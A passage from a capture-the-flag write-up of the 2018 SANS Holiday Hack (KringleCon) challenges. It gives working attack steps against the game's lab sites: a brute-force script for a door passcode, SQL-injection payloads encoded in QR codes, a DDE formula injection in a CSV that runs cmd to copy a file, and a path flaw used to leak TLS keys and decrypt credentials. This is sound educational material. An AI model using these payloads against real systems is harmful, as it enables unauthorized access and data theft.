0x7fffffffe5fc: 0x00001721
(gdb) set {int}0x7fffffffe5fc=0x000004c9
(gdb) c
Continuing.

                                                                                
                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 38) exited normally]
```


## Questions

### 1 : Orientation Challenge

Access to `Kringle History Kiosk`.

Then web browser access to https://kringlecon.com/osint_challenge_windows.html?challenge=osint&id=7ffd7b7f-2b84-48da-ab5d-eb69567eb1d1 .

```
Answer all questions correctly to get the secret phrase!
Question 1
In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?
[*]Firmware
[ ]Clothing
[ ]Wireless adapter
[ ]Flux capacitor

Question 2
In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?
[ ]Elgnirk
[*]ATNAS
[ ]GITH
[ ]Savvy, Inc

Question 3
In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?
[ ]Tom-tom drums
[ ]DNA on a mug of milk
[ ]Cookie crumbs
[*]Business card

Question 4
In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?
[ ]Snozberry Pi
[ ]Blueberry Pi
[*]Cranberry Pi
[ ]Elderberry Pi

Question 5
In 2017, the North Pole was being bombarded by giant objects. What were they?
[ ]TCP packets
[*]Snowballs
[ ]misfit toys
[ ]Candy cares

Question 6
In 2017, Sam the snowman needed help reassembling pages torn from what?
[ ]The Bash man page
[ ]Scrooge's payroll ledger
[ ]System swap space
[*]The Great Book
```
I got the secret phrase `Happy Trails`.

### 2 : Directory Bwosing
`Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness`

Investigate the web site: https://cfp.kringlecastle.com/

<img src=img/02-01_Web_Top.PNG width=700px />

Click `CFP` in the upper right.

<img src=img/02-02_Web_cfp.PNG width=700px />

The URL path is changed to `/cfp/cfp.html`.
Then I accessed the URL path to `/cfp/` aiming at Directory Browsing.

<img src=img/02-03_Web_Index_of.PNG width=700px />

There are two files.
`rejected-talks.csv` is not linked from web page.

<img src=img/02-04_reject-talks.PNG width=700px />

I found the `John McClane` submitted the talk title `Data Loss for Rainbow Teams: A Path in the Darkness`.

### 3 : de Bruijn Sequences
`When you break into the speaker unpreparedness room, what does Morcel Nougat say?`

I need to unlock the door for the speaker unpreparedness room.

<img src=img/03-01_Door_Passcode.PNG width=700px />

First, choose from the left in order.
As a result, it was displayed as `Incorrect guess.`

<img src=img/03-02_Try-0123.PNG width=700px />

At the same time web access had occurred. (`i=0123`)

https://doorpasscode.kringlecastle.com/checkpass.php?i=0123&resourceId=6fd87b8b-6884-43f4-9709-78f65c30e481


<img src=img/03-03_DevTools_request-0123.PNG width=700px />

Next, choose from the right in order.

<img src=img/03-04_Try-3210.PNG width=700px />

The web access at that time is as follows (`i=3210`) :

https://doorpasscode.kringlecastle.com/checkpass.php?i=3210&resourceId=6fd87b8b-6884-43f4-9709-78f65c30e481

<img src=img/03-05_DevTools_request-3210.PNG width=700px />

The `i` parameter consists of `[0-3]{4}`.
Therefore, its combination is 256 patterns.
So I wrote the python script to find `success: true`.

```python
import requests
import itertools

nums = ("0", "1", "2", "3")
for i in list(itertools.product(nums, repeat=4)):
    check = "".join(i)
    url  = 'https://doorpasscode.kringlecastle.com/checkpass.php?i='
    url += check
    url += '&resourceId=6fd87b8b-6884-43f4-9709-78f65c30e481'

    response = requests.get(url)
    print (check, response.text)
```

I ran the python script.

```
>python 03_door_passcode.py
0000 {"success":false,"message":"Incorrect guess."}
0001 {"success":false,"message":"Incorrect guess."}
0002 {"success":false,"message":"Incorrect guess."}
0003 {"success":false,"message":"Incorrect guess."}
0010 {"success":false,"message":"Incorrect guess."}
0011 {"success":false,"message":"Incorrect guess."}
0012 {"success":false,"message":"Incorrect guess."}
0013 {"success":false,"message":"Incorrect guess."}
0020 {"success":false,"message":"Incorrect guess."}
0021 {"success":false,"message":"Incorrect guess."}
0022 {"success":false,"message":"Incorrect guess."}
0023 {"success":false,"message":"Incorrect guess."}
0030 {"success":false,"message":"Incorrect guess."}
0031 {"success":false,"message":"Incorrect guess."}
0032 {"success":false,"message":"Incorrect guess."}
0033 {"success":false,"message":"Incorrect guess."}
0100 {"success":false,"message":"Incorrect guess."}
0101 {"success":false,"message":"Incorrect guess."}
0102 {"success":false,"message":"Incorrect guess."}
0103 {"success":false,"message":"Incorrect guess."}
0110 {"success":false,"message":"Incorrect guess."}
0111 {"success":false,"message":"Incorrect guess."}
0112 {"success":false,"message":"Incorrect guess."}
0113 {"success":false,"message":"Incorrect guess."}
0120 {"success":true,"resourceId":"6fd87b8b-6884-43f4-9709-78f65c30e481","hash":"f99d06c58fae5264977df8ebf5dea61bf93dc7df96d5da3afaa97455c17623c5","message":"Correct guess!"}
```

By entering the mark as the result obtained, the door opens.

<img src=img/03-06_Correct_guess.PNG width=700px />

When I enter the room, Morcel Nougat says "`Welcome unprepared speaker!`".

### 4 : Data Repo Analysis
`Retrieve the encrypted ZIP file from the North Pole Git repository ( https://git.kringlecastle.com/Upatree/santas_castle_automation ) . What is the password to open this file?`

```
root@kali~# git clone https://git.kringlecastle.com/Upatree/santas_castle_automation.git
Cloning into 'santas_castle_automation'...
remote: Enumerating objects: 949, done.
remote: Counting objects: 100% (949/949), done.
remote: Compressing objects: 100% (545/545), done.
remote: Total 949 (delta 258), reused 879 (delta 205)
Receiving objects: 100% (949/949), 4.27 MiB | 2.72 MiB/s, done.
Resolving deltas: 100% (258/258), done.

root@kali~# cd santas_castle_automation/

root@kali~/santas_castle_automation# find . -name "*.zip"                        
./schematics/ventilation_diagram.zip
```

I used `git-grep` and `git-rev-list` to search for the word `password`.

```
root@kali~/santas_castle_automation# git grep -i Password $(git rev-list --all) | awk -F: '{print $3}' |sort -u
        f.puts "exec ssh -oStrictHostKeyChecking=no -oPasswordAuthentication=no -oKbdInteractiveAuthentication=no -oChallengeResponseAuthentication=no -oConnectTimeout=120 -i #{@resource.value(
      args += ["--ssh", "ssh -oStrictHostKeyChecking=no -oPasswordAuthentication=no -oKbdInteractiveAuthentication=no -oChallengeResponseAuthentication=no -i #{@resource.value(
      args.push('--password', @resource.value(
    desc "HTTP Basic Auth password"
    if @resource.value(
  newparam 
* Protect all sensitive files with strong a password.
Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!
Hopefully this is the last time we have to change our password again until next Christmas. 
If you find an old password 'neath folder or bush,
Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.
Password = 'Yippee-ki-yay'
password = 'pepper ministix'

root@kali~/santas_castle_automation# unzip schematics/ventilation_diagram.zip
Archive:  schematics/ventilation_diagram.zip
   creating: ventilation_diagram/
[schematics/ventilation_diagram.zip] ventilation_diagram/ventilation_diagram_2F.jpg password: pepper ministix
password incorrect--reenter: Yippee-ki-yay
  inflating: ventilation_diagram/ventilation_diagram_2F.jpg  
  inflating: ventilation_diagram/ventilation_diagram_1F.jpg  
```

Then I found two passphrase, `Yippee-ki-yay` and `pepper ministix`.
I tried each passphrase to unzip `ventilation_diagram.zip`.
In the result, the password was `Yippee-ki-yay`.


### 5 : AD Privilege Discovery
`Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name?`

> Hint: Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws.

> Hint: Bloodhound Tool From: Holly Evergreen


<img src=img/05-01_BloodHound.PNG width=700px />

Expand option in the upper left, and look at `Pre-Built Analytics Queries`.

<img src=img/05-02_Pre-Built_Analytics_Queries.PNG width=300px /><br />

In the list, There is the query `Shortest Paths to Domain Admins from Kerberoastable Users`.

<img src=img/05-03_Shortest_Path_to_.PNG width=300px />

So I selected it.

<img src=img/05-04_Query_Result.PNG width=700px />

The hint shows `avoid RDP as a control path as it depends on separate local privilege escalation flaws`. As a result of avoiding RDP, only `LDUBEJ00320@AD.KRINGLECASTLE.COM` user remained.

<img src=img/05-05_avoid_RDP.PNG width=700px />

### 6 : Badge Manipulation
`Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available. What is the access control number revealed by the door authentication panel?`

<img src=res/06/alabaster_badge.jpg width=300px />

Here is authentication system.
There are two kinds of input.
The first method is to upload the QR code from the USB mark. The other method is to click the fingerprint authentication mark.

<img src=img/06-01_Badge_Scan.PNG width=700px />

#### Solution1: Upload QR code from the USB mark.

First, I decoded the given ALABASTER SNOWBALL's QR code.
```
root@kali~/work# zbarimg alabaster_badge.jpg 
QR-Code:oRfjg5uGHmbduj2m
scanned 1 barcode symbols from 1 images in 0.03 seconds
```

I guessed that the following SQL statement would be executed inside the authentication system.

`SELECT ??? FROM ??? WHERE ?Secret_Code?=<Decoded_QRcode>`

So I created a QR code with the meaning of single-quote(') aiming at SQL error.

```
root@kali~/work# qrencode -o 06_single_quote.png \'

root@kali~/work# zbarimg 06_single_quote.png 
QR-Code:'
scanned 1 barcode symbols from 1 images in 0 seconds
```

<img src=img/06-02_QR_Single_Quote.PNG width=300px />

At this time I read javascript and found that only png is allowed.
```javascript
...(snip)...
    if (!allowed_extensions.includes(file_extension)) {
      set_green(false)
      $('#result_text').text('PNG Files Only');
...(snip)...
```

When uploading the created QR code, an exception error appeared.

<img src=img/06-03_EXCEPTION.png width=700px />

Response returned in JSON format as displayed contents.

<img src=img/06-04_EXCEPTION_response_json.png width=700px />

```
EXCEPTION AT (LINE 96 
"user_info = query("SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1".format(uid))"
): (1064, u"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1")
```

* DB server is MariaDB
* I got the SQL query to be executed.

`"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1".format(uid))`

Next I created a QR code to bypass WHERE Clause.

> SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '`'OR'A'='A`' LIMIT 1

```
root@kali~/work# qrencode -o 06_bypass_where.png \'OR\'A\'=\'A

root@kali~/work# zbarimg 06_bypass_where.png 
QR-Code:'OR'A'='A
scanned 1 barcode symbols from 1 images in 0 seconds
```

When uploading the created QR code, a different error message was displayed.

<img src=img/06-05_EXCEPTION_DISABLED.png width=700px />

`Authorized User Account Has Been Disabled!`

I looked at the SQL statement again and noticed a column named enabled in the employees table.
So I created a QR code to check the value of enable in the WHERE clause.

> SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '`'OR'A'='A'AND enabled=1 # `' LIMIT 1

```
root@kali~/work# qrencode -o 06_bypass_auth.png "'OR'A'='A'AND enabled=1 # " 

root@kali~/work# zbarimg 06_bypass_auth.png
QR-Code:'OR'A'='A'AND enabled=1 # 
scanned 1 barcode symbols from 1 images in 0.01 seconds
```

When uploading the created QR code, I succeeded in bypassing authentication.

<img src=img/06-06_USER_ACCESS_GRANTED.png width=700px />

The response at that time is as follows.

<img src=img/06-07_USER_ACCESS_GRANTED_response.png width=700px />

`User Access Granted - Control number 19880715`.

So access control number is `19880715`.


#### Solution2: Click the fingerprint authentication mark.

I clicked the fingerprint authentication mark in upper right.

<img src=img/06-08_fingerprint_touch.png width=700px />

The result is here.

<img src=img/06-09_fingerprint_QR_CODE_NOT_FOUND.png width=700px />

`QR Code Not Found. Only QR Code and White Space may be visible!`

The request at that time is as follows.
This request is a POST method and the request body has a parameter called b64barcode.

<img src=img/06-10_fingerprint_request.png width=700px />

b64barcode parameter contains the base64 encoded image data.
The image data you are sending is the following.

<img src=img/06-11_fingerprint_default_image.PNG width=700px />

I tried to send a QR code that bypassed the authentication in Solution 1.

```python
import requests
import base64

img = open("06_bypass_auth.png", "rb").read()
img_enc = base64.b64encode(img)

payload = {'b64barcode': img_enc}
headers = {'Cookie': 'resource_id=8ba72b47-8abd-4d77-a0b3-4f231bd1c785'}
url = 'https://scanomatic.kringlecastle.com/upload'

r = requests.post(url,headers=headers, data=payload)
print(r.text)
```

```
>python 06_fingerprint.py
{"data":"User Access Granted - Control number 19880715","request":true,"success":{"hash":"5c5913881bd850087c5f389a1a0d57bc5eb5a4856de23246f7d9dd7d0e1ff4f4","resourceId":"8ba72b47-8abd-4d77-a0b3-4f231bd1c785"}}
```

As a result, I got the access control number in this way.
Access control number is `19880715`.


### 7 : HR Incident Response
`Gain access to the website(https://careers.kringlecastle.com/) and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K."`

Investigate the web site: https://careers.kringlecastle.com/

<img src=img/07-01_TopPage.PNG width=700px />

When accessing `/candidate_evaluation.docx` 404 ERROR returned.

<img src=img/07-02_404_NOT_FOUND.PNG width=700px />

* The public directory of the webpage is `C:\careerportal\resources\public\`
* URL is `https://careers.kringlecastle.com/public/`

Therefore, the purpose is to copy the file from `C:\candidate_evaluation.docx` to `C:\careerportal\resources\public\candidate_evaluation.docx`.

CSV file can be uploaded from webpage form.

<img src=img/07-03_TopPage_Form.PNG width=400px />

If the administrator opens the csv file with excel, it may be able to exploit the DDE function.
So I created the CSV file that copies files using the DDE function like the following.

```
=cmd|'/c copy "C:\candidate_evaluation.docx" "C:\careerportal\resources\public\07_E5IbdUcGW6Exg.docx" '!A0
```

After uploading the CSV file, I can download the file by accessing the following URL.
https://careers.kringlecastle.com/public/07_E5IbdUcGW6Exg.docx

<img src=img/07-04_docx.PNG width=700px />

> Furthermore, there is intelligence from the North Pole this elf is linked to cyber terrorist organization `Fancy Beaver` who openly provides technical support to the villains that attacked our Holidays last year.

`Fancy Beaver` is secretly supported by Krampus.


### 8 : Network Traffic Forensics
`Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?`

> Hint: A elf found this out by looking at HTML comments left behind and was able to grab the server-side source code.

Investigate the web site: https://packalyzer.kringlecastle.com/

<img src=img/08-01_TopPage.PNG width=500px />

I registered the user first and then logged in.

<img src=img/08-02_Logined.PNG width=700px />

By checking the source code of html, there was a javascript comment like the following.

> //File upload Function. All extensions and sizes are validated server-side in `app.js`

I tried several URLs and found the server side `app.js` source code in the following URL.
https://packalyzer.kringlecastle.com/pub/app.js

I need to obtain SSLKEYLOGFILE in order to decode the https communication acquired by the web server.
When I read app.js, I can see that SSLKEYLOGFILE is saved from the following code.
```javascript
const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )
const options = {
  key: fs.readFileSync(__dirname + '/keys/server.key'),
  cert: fs.readFileSync(__dirname + '/keys/server.crt'),
  http2: {
    protocol: 'h2',         // HTTP2 only. NOT HTTP1 or HTTP1.1
    protocols: [ 'h2' ],
  },
  keylog : key_log_path     //used for dev mode to view traffic. Stores a few minutes worth at a time
};
```

SSLKEYLOGFILE is stored in `__dirname + process.env.DEV + process.env.SSLKEYLOGFILE`. It is necessary to identify `__dirname`, `process.env.DEV` and `process.env.SSLKEYLOGFILE`.
Extract noteworthy parts from app.js.

```javascript
function load_envs() {
  var dirs = []
  var env_keys = Object.keys(process.env)
  for (var i=0; i < env_keys.length; i++) {
    if (typeof process.env[env_keys[i]] === "string" ) {
      dirs.push(( "/"+env_keys[i].toLowerCase()+'/*') )
    }
  }
  return uniqueArray(dirs)
}
if (dev_mode) {
    //Can set env variable to open up directories during dev
    const env_dirs = load_envs();
} else {
    const env_dirs = ['/pub/','/uploads/'];
}

router.get(env_dirs,  async (ctx, next) => {
try {
    var Session = await sessionizer(ctx);
    //Splits into an array delimited by /
    let split_path = ctx.path.split('/').clean("");
    //Grabs directory which should be first element in array
    let dir = split_path[0].toUpperCase();
    split_path.shift();
    let filename = "/"+split_path.join('/');
    while (filename.indexOf('..') > -1) {
    filename = filename.replace(/\.\./g,'');
    }
    if (!['index.html','home.html','register.html'].includes(filename)) {
    ctx.set('Content-Type',mime.lookup(__dirname+(process.env[dir] || '/pub/')+filename))
    ctx.body = fs.readFileSync(__dirname+(process.env[dir] || '/pub/')+filename)
    } else {
    ctx.status=404;
    ctx.body='Not Found';
    }
} catch (e) {
    ctx.body=e.toString();
}
});
```

After calling `load_envs()` the `env_dirs` contains the following data.
```
env_dirs
[ '/path/*',
  '/dev/*',
  '/sslkeylogfile/*,
  ...]
 ```
```

Therefore, when I access `https://packalyzer.kringlecastle.com/sslkeylogfile/`, the process transitions to the function specified by the second argument of `router.get()`.

The local variable `dir` is `SSLKEYLOGFILE`.
Therefore, it tries to read the file of "`__dirname + process.env['SSLKEYLOGFILE'] + filename`".
If the file does not exist, the file path is displayed as an error.

Request the next to examine three variables (`__dirname`, `process.env.DEV` and `process.env.SSLKEYLOGFILE`)
```
root@kali~/work# curl 'https://packalyzer.kringlecastle.com/sslkeylogfile/a'; echo
Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/a'

root@kali~/work# curl 'https://packalyzer.kringlecastle.com/dev/a'; echo
Error: ENOENT: no such file or directory, open '/opt/http2/dev//a'
```

* __dirname == `/opt/http2`
* process.env.DEV == `/dev/`
* process.env.SSLKEYLOGFILE == `packalyzer_clientrandom_ssl.log`


Therefore, SSLKEYLOGFILE for decrypting the https communication acquired by the server can be obtained at the following URL.

https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log

```
root@kali~/work# curl 'https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log'
CLIENT_RANDOM 1B36D2205C96A8C71B07CBA6B2773A883892CB7E07A72B38F5A36AC83A8C3855 ED90DBF8CB4E606AB364127F5D8D7E6CFDC38AF490ABDADD87C47D0971CB623A895946933778C5CC39AAA2A343E06B13
CLIENT_RANDOM 6E44A324A1858A31245A35C13125C19C31E1BE2BE020BBE69A17FADC97E1CBCC 883DCFFF1CDE63ECF3EFBC68F82E3D7EA7B42C1437C75FABEDDC4EA6223FC563FA376DC586AD8DC9EB1822A25EAE36BE
CLIENT_RANDOM 372274E99D6B9512C290F3F09B09F6578C43BECD202F0E645953B24B7C19AD4B 25B981C0E9A6A6C1B305B10CDBC6A45A6ED6DB8B2EBB140ED364075CC5058CA2FE25DCE3AEE3456B1D0AF13F89665078
...(snip)...
```

Next, I get communication of server.
I clicked the `SNIFF TRAFFIC` button after logging in.

<img src=img/08-03_Sniffing.PNG width=700px />

After 20 seconds, I can download the traffic by pressing the `Captures` button on the top right.

<img src=img/08-04_Sniffing-Download.PNG width=700px />

Also obtain SSLKEYLOGFILE at the same time.

```
root@kali~/work# curl 'https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log' -o 08_packalyzer_clientrandom_ssl.log
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 42064  100 42064    0     0  12083      0  0:00:03  0:00:03 --:--:-- 12083
```

And I used tshark to decrypt the ssl communication.

```
root@kali~/work# tshark -nr 89940429_6-1-2019_0-37-28.pcap -o ssl.keylog_file:08_packalyzer_clientrandom_ssl.log -Y 'http2.headers.method=="GET"' 2>/dev/null
   14   0.013422 10.126.0.104 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
   64   0.066933 10.126.0.104 → 10.126.0.3   HTTP2 257 HEADERS[1]: GET /
  100   3.017706 10.126.0.105 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
  109   3.019027 10.126.0.106 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
  194   3.071777 10.126.0.105 → 10.126.0.3   HTTP2 256 HEADERS[1]: GET /
  215   3.077752 10.126.0.106 → 10.126.0.3   HTTP2 256 HEADERS[1]: GET /
  241   7.017298 10.126.0.106 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
  291   7.070745 10.126.0.106 → 10.126.0.3   HTTP2 258 HEADERS[1]: GET /
  316  10.020008 10.126.0.104 → 10.126.0.3   HTTP2 221 HEADERS[1]: GET /
  363  10.073372 10.126.0.104 → 10.126.0.3   HTTP2 256 HEADERS[1]: GET /

root@kali~/work# tshark -nr 89940429_6-1-2019_0-37-28.pcap -o ssl.keylog_file:08_packalyzer_clientrandom_ssl.log -Y 'http2.headers.method=="POST"' 2>/dev/null
   40   0.042445 10.126.0.104 → 10.126.0.3   HTTP2 299 HEADERS[1]: POST /api/login
  145   3.045470 10.126.0.105 → 10.126.0.3   HTTP2 298 HEADERS[1]: POST /api/login
  159   3.048710 10.126.0.106 → 10.126.0.3   HTTP2 298 HEADERS[1]: POST /api/login
  266   7.045143 10.126.0.106 → 10.126.0.3   HTTP2 300 HEADERS[1]: POST /api/login
  339  10.047917 10.126.0.104 → 10.126.0.3   HTTP2 298 HEADERS[1]: POST /api/login
```

Probably because `POST /api/login` requests contains credential information, it searches for `Holly Evergreen` or `Alabaster Snowball` credential information.
The tshark display filter was set with the following items.

* Request to server : `ip.dst_host == 10.126.0.3`
* The payload contains either alabaster or holly : `http2.data.data matches alabaster or http2 matches holly`

As a result, the display filter was set as follows.

> ip.dst_host == 10.126.0.3 and (http2.data.data matches alabaster or http2 matches holly)

```
root@kali~/work# tshark -Px -nr 89940429_6-1-2019_0-37-28.pcap -o ssl.keylog_file:08_packalyzer_clientrandom_ssl.log -Y "ip.dst_host == 10.126.0.3 and (http2.data.data matches alabaster or http2 matches holly)" 2>/dev/null
   42   0.042498 10.126.0.104 → 10.126.0.3   HTTP2 202 DATA[1] (application/json)

Frame (202 bytes):
0000  00 00 00 00 00 00 00 00 00 00 00 00 08 00 45 00   ..............E.
0010  00 bc 6d 0e 40 00 40 06 b7 c7 0a 7e 00 68 0a 7e   ..m.@.@....~.h.~
0020  00 03 9f 0d 01 bb 3b a9 b9 2d 8d c5 9a af 80 18   ......;..-......
0030  05 55 16 15 00 00 01 01 08 0a 01 0a db 45 01 0a   .U...........E..
0040  db 45 17 03 03 00 83 1e 60 eb d6 c0 22 45 b1 a5   .E......`..."E..
0050  5f dc 93 80 8f 56 f0 5f 9e f3 ce bd 4c 2e d7 ce   _....V._....L...
0060  7f 22 cc 24 6d cd 46 1e 3a 6e af 8a ef 89 98 cd   .".$m.F.:n......
0070  70 4b 2f 44 92 a8 83 94 7a 60 28 47 f3 18 4a 23   pK/D....z`(G..J#
0080  20 65 af 04 b7 be 67 74 1e b9 b6 63 d8 c6 a9 36    e....gt...c...6
0090  ab 44 48 0b e9 82 f0 5c 91 6a 0e 2b 04 17 04 8e   .DH....\.j.+....
00a0  1e bb fc f0 58 ac e3 eb 0f 3f a0 c5 ad 8f 5e d7   ....X....?....^.
00b0  22 49 87 29 f2 16 3e 4b d6 5c 8f 52 a7 6a 09 e4   "I.)..>K.\.R.j..
00c0  7a 28 5b 20 76 91 f0 75 6a 37                     z([ v..uj7
Decrypted SSL (107 bytes):
0000  00 00 62 00 01 00 00 00 01 1f 8b 08 08 ce 4d 31   ..b...........M1
0010  5c 00 03 35 37 4a 42 37 39 35 42 50 46 2e 74 6d   \..57JB795BPF.tm
0020  70 00 ab 56 2a 2d 4e 2d ca 4b cc 4d 55 b2 52 50   p..V*-N-.K.MU.RP
0030  4a cc 49 4c 4a 2c 2e 49 2d 52 d2 51 50 2a 48 2c   J.ILJ,.I-R.QP*H,
0040  2e 2e cf 2f 4a 01 49 04 24 26 67 a7 16 e9 16 38   .../J.I.$&g....8
0050  14 a5 ea 96 94 16 e5 95 24 26 e5 a4 1a 5a 1a 29   ........$&...Z.)
0060  d5 02 00 3a dc 68 d6 41 00 00 00                  ...:.h.A...
Uncompressed entity body (65 bytes):
0000  7b 22 75 73 65 72 6e 61 6d 65 22 3a 20 22 61 6c   {"username": "al
0010  61 62 61 73 74 65 72 22 2c 20 22 70 61 73 73 77   abaster", "passw
0020  6f 72 64 22 3a 20 22 50 61 63 6b 65 72 2d 70 40   ord": "Packer-p@
0030  72 65 2d 74 75 72 6e 74 61 62 6c 65 31 39 32 22   re-turntable192"
0040  7d                                                }

  341  10.048738 10.126.0.104 → 10.126.0.3   HTTP2 202 DATA[1] (application/json)

Frame (202 bytes):
0000  00 00 00 00 00 00 00 00 00 00 00 00 08 00 45 00   ..............E.
0010  00 bc d1 b1 40 00 40 06 53 24 0a 7e 00 68 0a 7e   ....@.@.S$.~.h.~
0020  00 03 e3 2f 01 bb f6 83 37 95 01 8b 0a 41 80 18   .../....7....A..
0030  05 55 16 15 00 00 01 01 08 0a 01 0a e5 0b 01 0a   .U..............
0040  e5 0b 17 03 03 00 83 06 40 a0 a9 69 e3 21 65 ff   ........@..i.!e.
0050  db bb 83 bd 49 2c 96 9a 7e 38 18 c2 cf a0 16 06   ....I,..~8......
0060  ba ce 38 67 87 b6 1d 17 b8 7e 11 bd 63 5c dc 96   ..8g.....~..c\..
0070  5b 55 78 b0 54 4b 99 b2 b4 0d a7 63 c7 94 97 25   [Ux.TK.....c...%
0080  36 72 94 77 1b 99 c1 8c fd 78 f9 6d d1 30 ea e0   6r.w.....x.m.0..
0090  59 42 18 15 b7 cd 91 3a e4 52 66 08 b7 d8 80 a1   YB.....:.Rf.....
00a0  f6 c2 3e 2e 35 7e 25 3a 86 02 69 54 10 7f 3a 1f   ..>.5~%:..iT..:.
00b0  ed 21 1d 77 b6 36 4d 1b a4 54 c9 c3 f1 a4 ee 34   .!.w.6M..T.....4
00c0  a7 01 0c 56 c9 02 ae 37 6c 9a                     ...V...7l.
Decrypted SSL (107 bytes):
0000  00 00 62 00 01 00 00 00 01 1f 8b 08 08 d8 4d 31   ..b...........M1
0010  5c 00 03 4e 36 31 5a 38 4c 47 41 42 45 2e 74 6d   \..N61Z8LGABE.tm
0020  70 00 ab 56 2a 2d 4e 2d ca 4b cc 4d 55 b2 52 50   p..V*-N-.K.MU.RP
0030  4a cc 49 4c 4a 2c 2e 49 2d 52 d2 51 50 2a 48 2c   J.ILJ,.I-R.QP*H,
0040  2e 2e cf 2f 4a 01 49 04 24 26 67 a7 16 e9 16 38   .../J.I.$&g....8
0050  14 a5 ea 96 94 16 e5 95 24 26 e5 a4 1a 5a 1a 29   ........$&...Z.)
0060  d5 02 00 3a dc 68 d6 41 00 00 00                  ...:.h.A...
Uncompressed entity body (65 bytes):
0000  7b 22 75 73 65 72 6e 61 6d 65 22 3a 20 22 61 6c   {"username": "al
0010  61 62 61 73 74 65 72 22 2c 20 22 70 61 73 73 77   abaster", "passw
0020  6f 72 64 22 3a 20 22 50 61 63 6b 65 72 2d 70 40   ord": "Packer-p@
0030  72 65 2d 74 75 72 6e 74 61 62 6c 65 31 39 32 22   re-turntable192"
0040  7d                                                }
```

I found credentials in JSON data.

```json
{
    "username": "alabaster", 
    "password": "Packer-p@re-turntable192"
}
```

Log off the website once and log in to the system using this credential.
I pressed the `Captures` button and confirmed `Saved Pcaps`, I found a pcap file named `super_secret_packet_capture.pcap`.
And I downloaded it.

<img src=img/08-05_alabaster-captures.PNG width=700px />

In that pcap there was SMTP communication of mail sent from `Holly Evergreen` to `Alabaster Snowball`.

<img src=img/08-06_SMTP.PNG width=400px />

```
Date: Fri, 28 Sep 2018 11:33:17 -0400
To: alabaster.snowball@mail.kringlecastle.com
From: Holly.evergreen@mail.kringlecastle.com
Subject: test Fri, 28 Sep 2018 11:33:17 -0400
--------------------------------------
Hey alabaster, 

Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.
```

And a PDF file was attached.

<img src=img/08-07_SMTP_attachPDF.PNG width=700px />

> We’ve just taken Mary Had a Little Lamb from Bb to A!

Therefore, the name of the song described in the document sent from `Holly Evergreen` to `Alabaster Snowball` is `Mary Had a Little Lamb`.


### 9 : Ransomware Recovery
`Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks.`

#### 9-1 : Catch the Malware
`Then create a rule that will catch all new infections. What is the success message displayed by the Snort terminal?`

I can download traffic on https://elf:onashelf@snortsensor1.kringlecastle.com/
Download one pcap file and check it with tshark.

```
root@kali~/work# tshark -nr snort.log.1546743472.3595235.pcap 2>/dev/null
    1   0.000000 10.126.0.117 → 77.88.55.60  DNS 74 Standard query 0x72cb TXT maloney.fosterhood.yandex.ru
